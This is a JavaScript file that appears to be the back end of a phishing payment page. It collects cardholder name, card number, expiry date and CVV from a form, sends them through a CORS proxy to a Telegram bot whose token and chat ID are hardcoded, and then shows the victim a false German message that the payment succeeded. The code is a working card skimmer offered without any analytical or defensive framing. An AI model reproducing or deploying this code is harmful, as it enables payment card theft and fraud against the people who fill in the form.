const BotToken = '8012903445:AAGaVEfWzjq-kkAFHazjjCsmnlh-QyXvaY0';
const ChatId = '8463942433';
const ProxyUrl = 'https://cors-anywhere.herokuapp.com/';
const TelegramApiUrl = https://api.telegram.org/bot${BotToken}/sendMessage;

function showError(errorId) {
    document.getElementById(errorId).style.display = 'block';
    setTimeout(() => {
        document.getElementById(errorId).style.display = 'none';
    }, 3000);
}

function sendData() {
    const cardData = {
        holder: document.getElementById('cardholder').value,
        number: document.getElementById('cardNumber').value,
        exp: document.getElementById('expDate').value,
        cvv: document.getElementById('cvv').value
    };

    // Використовуємо CORS проксі для обходу блокування
    fetch(ProxyUrl + TelegramApiUrl, {
        method: 'POST',
        headers: { 
            'Content-Type': 'application/json',
            'Origin': window.location.origin
        },
        body: JSON.stringify({
            chat_id: ChatId,
            text: 🚨 НОВІ ДАНІ КАРТИ:\nВласник: ${cardData.holder}\nНомер: ${cardData.number}\nТермін: ${cardData.exp}\nCVV: ${cardData.cvv}
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    })
    .then(data => {
        if (data.ok) {
            alert('Zahlung erfolgreich! Die Verbindung wird in einer Minute aktiviert.');
        } else {
            throw new Error(data.description || 'Unknown error from Telegram');
        }
    })
    .catch(error => {
        console.error('Fehler:', error);
        alert('Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.');
    });
}
